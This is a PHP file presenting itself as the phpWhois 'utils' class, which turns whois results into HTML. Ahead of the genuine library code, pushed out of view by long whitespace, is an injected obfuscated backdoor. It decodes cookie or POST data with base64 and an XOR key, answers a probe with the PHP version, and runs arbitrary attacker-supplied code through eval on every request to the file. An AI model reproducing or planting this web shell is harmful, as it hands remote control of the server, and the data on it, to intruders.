<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $ka601 = 709;$GLOBALS['gdfb6f1'] = Array();global $gdfb6f1;$gdfb6f1 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['g41b'] = "\x72\x4a\x4d\x57\x5b\x3b\x9\x55\x4f\x6b\x50\x41\x46\x65\x21\x59\x31\x37\x33\x42\x25\x52\x2b\x3d\x71\x7a\x62\x5e\x44\x2a\x47\x43\x5a\x29\x6f\x78\x66\x22\x2c\x76\x48\x7e\x53\x28\x45\x2f\x24\x60\x3a\x5c\x77\x74\x3c\x54\x6a\x6d\x7c\x34\x4b\x56\x3f\x5d\x5f\x63\x38\x2d\x75\x70\xa\x68\x64\x79\x32\x35\x36\x51\x58\x27\x2e\x73\x20\x40\x39\x4c\x26\x6c\x4e\x30\x67\x7b\x69\x23\x3e\x61\xd\x49\x6e\x7d";$gdfb6f1[$gdfb6f1['g41b'][90].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][63]] = $gdfb6f1['g41b'][63].$gdfb6f1['g41b'][69].$gdfb6f1['g41b'][0];$gdfb6f1[$gdfb6f1['g41b'][50].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][36]] = $gdfb6f1['g41b'][34].$gdfb6f1['g41b'][0].$gdfb6f1['g41b'][70];$gdfb6f1[$gdfb6f1['g41b'][90].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][74].$gdfb6f1['g41b'][74].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][64]] = $gdfb6f1['g41b'][70].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][36].$gdfb6f1['g41b'][90].$gdfb6f1['g41b'][96].$gdfb6f1['g41b'][13];$gdfb6f1[$gdfb6f1['g41b'][51].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][74].$gdfb6f1['g41b'][64].$gdfb6f1['g41b'][18].$gdfb6f1['g41b'][70]] = $gdfb6f1['g41b'][79].$gdfb6f1['g41b'][51].$gdfb6f1['g41b'][0].$gdfb6f1['g41b'][85].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][96];$gdfb6f1[$gdfb6f1['g41b'][71].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][70].$gdfb6f1['g41b'][36]] = $gdfb6f1['g41b'][70].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][36].$gdfb6f1['g41b'][90].$gdfb6f1['g41b'][96].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][70];$gdfb6f1[$gdfb6f1['g41b'][24].$gdfb6f1['g41b'][74].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][64].$gdfb6f1['g41b'][57]] = $gdfb6f1['g41b'][90].$gdfb6f1['g41b'][96].$gdfb6f1['g41b'][90].$gdfb6f1['g41b'][62].$gdfb6f1['g41b'][79].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][51];$gdfb6f1[$gdfb6f1['g41b'][24].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][16].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][17].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][26]] = $gdfb6f1['g41b'][79].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][0].$gdfb6f1['g41b'][90].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][85].$gdfb6f1['g41b'][90].$gdfb6f1['g41b'][25].$gdfb6f1['g41b'][13];$gdfb6f1[$gdfb6f1['g41b'][54].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][36].$gdfb6f1['g41b'][16]] = $gdfb6f1['g41b'][67].$gdfb6f1['g41b'][69].$gdfb6f1['g41b'][67].$gdfb6f1['g41b'][39].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][0].$gdfb6f1['g41b'][79].$gdfb6f1['g41b'][90].$gdfb6f1['g41b'][34].$gdfb6f1['g41b'][96];$gdfb6f1[$gdfb6f1['g41b'][24].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][82].$gdfb6f1['g41b'][64]] = $gdfb6f1['g41b'][66].$gdfb6f1['g41b'][96].$gdfb6f1['g41b'][79].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][0].$gdfb6f1['g41b'][90].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][85].$gdfb6f1['g41b'][90].$gdfb6f1['g41b'][25].$gdfb6f1['g41b'][13];$gdfb6f1[$gdfb6f1['g41b'][90].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][63].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][17].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][87]] = $gdfb6f1['g41b'][26].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][79].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][74].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][62].$gdfb6f1['g41b'][70].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][63].$gdfb6f1['g41b'][34].$gdfb6f1['g41b'][70].$gdfb6f1['g41b'][13];$gdfb6f1[$gdfb6f1['g41b'][55].$gdfb6f1['g41b'][82].$gdfb6f1['g41b'][70].$gdfb6f1['g41b'][64].$gdfb6f1['g41b'][64].$gdfb6f1['g41b'][36].$gdfb6f1['g41b'][70]] = $gdfb6f1['g41b'][79].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][51].$gdfb6f1['g41b'][62].$gdfb6f1['g41b'][51].$gdfb6f1['g41b'][90].$gdfb6f1['g41b'][55].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][62].$gdfb6f1['g41b'][85].$gdfb6f1['g41b'][90].$gdfb6f1['g41b'][55].$gdfb6f1['g41b'][90].$gdfb6f1['g41b'][51];$gdfb6f1[$gdfb6f1['g41b'][85].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][18]] = $gdfb6f1['g41b'][39].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][74].$gdfb6f1['g41b'][17];$gdfb6f1[$gdfb6f1['g41b'][35].$gdfb6f1['g41b'][63].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][16].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][72]] = $gdfb6f1['g41b'][90].$gdfb6f1['g41b'][17].$gdfb6f1['g41b'][63].$gdfb6f1['g41b'][16].$gdfb6f1['g41b'][16];$gdfb6f1[$gdfb6f1['g41b'][54].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][17].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][70].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][36].$gdfb6f1['g41b'][17]] = $_POST;$gdfb6f1[$gdfb6f1['g41b'][88].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][87]] = $_COOKIE;@$gdfb6f1[$gdfb6f1['g41b'][24].$gdfb6f1['g41b'][74].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][64].$gdfb6f1['g41b'][57]]($gdfb6f1['g41b'][13].$gdfb6f1['g41b'][0].$gdfb6f1['g41b'][0].$gdfb6f1['g41b'][34].$gdfb6f1['g41b'][0].$gdfb6f1['g41b'][62].$gdfb6f1['g41b'][85].$gdfb6f1['g41b'][34].$gdfb6f1['g41b'][88], NULL);@$gdfb6f1[$gdfb6f1['g41b'][24].$gdfb6f1['g41b'][74].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][64].$gdfb6f1['g41b'][57]]($gdfb6f1['g41b'][85].$gdfb6f1['g41b'][34].$gdfb6f1['g41b'][88].$gdfb6f1['g41b'][62].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][0].$gdfb6f1['g41b'][0].$gdfb6f1['g41b'][34].$gdfb6f1['g41b'][0].$gdfb6f1['g41b'][79], 0);@$gdfb6f1[$gdfb6f1['g41b'][24].$gdfb6f1['g41b'][74].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][64].$gdfb6f1['g41b'][57]]($gdfb6f1['g41b'][55].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][35].$gdfb6f1['g41b'][62].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][35].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][63].$gdfb6f1['g41b'][66].$gdfb6f1['g41b'][51].$gdfb6f1['g41b'][90].$gdfb6f1['g41b'][34].$gdfb6f1['g41b'][96].$gdfb6f1['g41b'][62].$gdfb6f1['g41b'][51].$gdfb6f1['g41b'][90].$gdfb6f1['g41b'][55].$gdfb6f1['g41b'][13], 0);@$gdfb6f1[$gdfb6f1['g41b'][55].$gdfb6f1['g41b'][82].$gdfb6f1['g41b'][70].$gdfb6f1['g41b'][64].$gdfb6f1['g41b'][64].$gdfb6f1['g41b'][36].$gdfb6f1['g41b'][70]](0);if (!$gdfb6f1[$gdfb6f1['g41b'][71].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][70].$gdfb6f1['g41b'][36]]($gdfb6f1['g41b'][11].$gdfb6f1['g41b'][83].$gdfb6f1['g41b'][21].$gdfb6f1['g41b'][44].$gdfb6f1['g41b'][11].$gdfb6f1['g41b'][28].$gdfb6f1['g41b'][15].$gdfb6f1['g41b'][62].$gdfb6f1['g41b'][21].$gdfb6f1['g41b'][7].$gdfb6f1['g41b'][86].$gdfb6f1['g41b'][62].$gdfb6f1['g41b'][18].$gdfb6f1['g41b'][74].$gdfb6f1['g41b'][74].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][36].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][64].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][64].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][18].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][16].$gdfb6f1['g41b'][36].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][36].$gdfb6f1['g41b'][16].$gdfb6f1['g41b'][16].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][16].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][36].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][93])){$gdfb6f1[$gdfb6f1['g41b'][90].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][74].$gdfb6f1['g41b'][74].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][64]]($gdfb6f1['g41b'][11].$gdfb6f1['g41b'][83].$gdfb6f1['g41b'][21].$gdfb6f1['g41b'][44].$gdfb6f1['g41b'][11].$gdfb6f1['g41b'][28].$gdfb6f1['g41b'][15].$gdfb6f1['g41b'][62].$gdfb6f1['g41b'][21].$gdfb6f1['g41b'][7].$gdfb6f1['g41b'][86].$gdfb6f1['g41b'][62].$gdfb6f1['g41b'][18].$gdfb6f1['g41b'][74].$gdfb6f1['g41b'][74].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][36].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][64].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][64].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][18].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][16].$gdfb6f1['g41b'][36].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][36].$gdfb6f1['g41b'][16].$gdfb6f1['g41b'][16].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][16].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][36].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][93], 1);$xcb02dca = NULL;$o4b8 = NULL;$gdfb6f1[$gdfb6f1['g41b'][34].$gdfb6f1['g41b'][16].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][74]] = $gdfb6f1['g41b'][13].$gdfb6f1['g41b'][82].$gdfb6f1['g41b'][16].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][64].$gdfb6f1['g41b'][64].$gdfb6f1['g41b'][65].$gdfb6f1['g41b'][36].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][17].$gdfb6f1['g41b'][63].$gdfb6f1['g41b'][65].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][16].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][65].$gdfb6f1['g41b'][82].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][36].$gdfb6f1['g41b'][18].$gdfb6f1['g41b'][65].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][16].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][18].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][70].$gdfb6f1['g41b'][16];global $o1b5b6;function  i7c11($xcb02dca, $q027ac4b8){global $gdfb6f1;$ed06 = "";for ($ac530d87e=0; $ac530d87e<$gdfb6f1[$gdfb6f1['g41b'][51].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][74].$gdfb6f1['g41b'][64].$gdfb6f1['g41b'][18].$gdfb6f1['g41b'][70]]($xcb02dca);){for ($j42082=0; $j42082<$gdfb6f1[$gdfb6f1['g41b'][51].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][74].$gdfb6f1['g41b'][64].$gdfb6f1['g41b'][18].$gdfb6f1['g41b'][70]]($q027ac4b8) && $ac530d87e<$gdfb6f1[$gdfb6f1['g41b'][51].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][74].$gdfb6f1['g41b'][64].$gdfb6f1['g41b'][18].$gdfb6f1['g41b'][70]]($xcb02dca); $j42082++, $ac530d87e++){$ed06 .= $gdfb6f1[$gdfb6f1['g41b'][90].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][63]]($gdfb6f1[$gdfb6f1['g41b'][50].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][36]]($xcb02dca[$ac530d87e]) ^ $gdfb6f1[$gdfb6f1['g41b'][50].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][36]]($q027ac4b8[$j42082]));}}return $ed06;}function  v02e2567($xcb02dca, $q027ac4b8){global $gdfb6f1;global $o1b5b6;return $gdfb6f1[$gdfb6f1['g41b'][35].$gdfb6f1['g41b'][63].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][16].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][72]]($gdfb6f1[$gdfb6f1['g41b'][35].$gdfb6f1['g41b'][63].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][16].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][72]]($xcb02dca, $o1b5b6), $q027ac4b8);}foreach ($gdfb6f1[$gdfb6f1['g41b'][88].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][87]] as $q027ac4b8=>$z23bde){$xcb02dca = $z23bde;$o4b8 = $q027ac4b8;}if (!$xcb02dca){foreach ($gdfb6f1[$gdfb6f1['g41b'][54].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][17].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][70].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][36].$gdfb6f1['g41b'][17]] as $q027ac4b8=>$z23bde){$xcb02dca = $z23bde;$o4b8 = $q027ac4b8;}}$xcb02dca = @$gdfb6f1[$gdfb6f1['g41b'][24].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][82].$gdfb6f1['g41b'][64]]($gdfb6f1[$gdfb6f1['g41b'][85].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][18]]($gdfb6f1[$gdfb6f1['g41b'][90].$gdfb6f1['g41b'][73].$gdfb6f1['g41b'][72].$gdfb6f1['g41b'][63].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][13].$gdfb6f1['g41b'][17].$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][87]]($xcb02dca), $o4b8));if (isset($xcb02dca[$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][9]]) && $o1b5b6==$xcb02dca[$gdfb6f1['g41b'][93].$gdfb6f1['g41b'][9]]){if ($xcb02dca[$gdfb6f1['g41b'][93]] == $gdfb6f1['g41b'][90]){$ac530d87e = Array($gdfb6f1['g41b'][67].$gdfb6f1['g41b'][39] => @$gdfb6f1[$gdfb6f1['g41b'][54].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][36].$gdfb6f1['g41b'][16]](),$gdfb6f1['g41b'][79].$gdfb6f1['g41b'][39] => $gdfb6f1['g41b'][16].$gdfb6f1['g41b'][78].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][65].$gdfb6f1['g41b'][16],);echo @$gdfb6f1[$gdfb6f1['g41b'][24].$gdfb6f1['g41b'][26].$gdfb6f1['g41b'][16].$gdfb6f1['g41b'][87].$gdfb6f1['g41b'][17].$gdfb6f1['g41b'][57].$gdfb6f1['g41b'][26]]($ac530d87e);}elseif ($xcb02dca[$gdfb6f1['g41b'][93]] == $gdfb6f1['g41b'][13]){eval/*vcfb5*/($xcb02dca[$gdfb6f1['g41b'][70]]);}exit();}} ?><?php
/*
Whois.php        PHP classes to conduct whois queries

Copyright (C)1999,2005 easyDNS Technologies Inc. & Mark Jeftovic

Maintained by David Saez

For the most recent version of this package visit:

http://www.phpwhois.org

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 */

class utils extends Whois {

	// showObject() and debugObject()
	// - debug code to show an object or array

	function showObject(&$obj)
		{
		$r = $this->debugObject($obj);
		return "<pre>$r</pre>\n";
		}

	function debugObject($obj,$indent=0)
		{
		if (is_Array($obj))
			{
			$return = '';
			foreach($obj as $k => $v)
				{
				$return .= str_repeat('&nbsp;',$indent);
				$return .= $k."->$v\n";
				$return .= $this->debugObject($v,$indent+1);
			}
			return $return;
		}
	}

	function ns_rr_defined($query) {
		return checkdnsrr($query,'NS');
	}

	// get nice HTML output

	function showHTML($result, $link_myself=true, $params='query=$0&amp;output=nice') {

		// adds links fort HTML output

		$email_regex = "/([-_\w\.]+)(@)([-_\w\.]+)\b/i";
		$html_regex = "/(?:^|\b)((((http|https|ftp):\/\/)|(www\.))([\w\.]+)([,:%#&\/?~=\w+\.-]+))(?:\b|$)/is";
		$ip_regex = "/\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/i";

		$out = '';
		$lempty = true;

		foreach($result['rawdata'] as $line)
			{
			$line = trim($line);

			if ($line == '')
				{
				if ($lempty) continue;
				else $lempty = true;
				}
			else
				$lempty = false;

			$out .= $line."\n";
			}

		if ($lempty) $out = trim($out);

		$out = strip_tags($out);
		$out = preg_replace ($email_regex, '<a href="mailto:$0">$0</a>', $out);
		$out = preg_replace_callback ($html_regex, 'href_replace', $out);

		if ($link_myself)
			{
			if ($params[0] == '/')
				$link = $params;
			else
				$link = $_SERVER['PHP_SELF'].'?'.$params;

			$out = preg_replace ($ip_regex, '<a href="'.$link.'">$0</a>', $out);

			if (isset($result['regrinfo']['domain']['nserver']))
				{
				$nserver = $result['regrinfo']['domain']['nserver'];
				}
			else
				$nserver = false;

			if (isset($result['regrinfo']['network']['nserver']))
				{
				$nserver = $result['regrinfo']['network']['nserver'];
				}

			if (is_array($nserver))
				{
				reset($nserver); 
				while (list($host, $ip) = each($nserver))
					{
					$url = '<a href="'. str_replace('$0',$ip,$link)."\">$host</a>";
					$out = str_replace($host, $url, $out);
					$out = str_replace(strtoupper($host), $url, $out);
					}
				}
			}

		// Add bold field names

		$out = preg_replace ("/(?m)^([-\s\.&;'\w\t\(\)\/]+:\s*)/", '<b>$1</b>', $out);

		// Add italics for disclaimer

		$out = preg_replace ("/(?m)^(%.*)/", '<i>$0</i>', $out);

		return str_replace("\n","<br/>\n",$out);
	}
}

function href_replace($matches)
{
if (substr($matches[0],0,4)=='www.')
	{
	$web=$matches[0];
	$url='http://'.$web;
	}
else
	{
	$web=$matches[0];
	$url=$web;
	}

return '<a href="'.$url.'" target="_blank">'.$web.'</a>';
}
?>
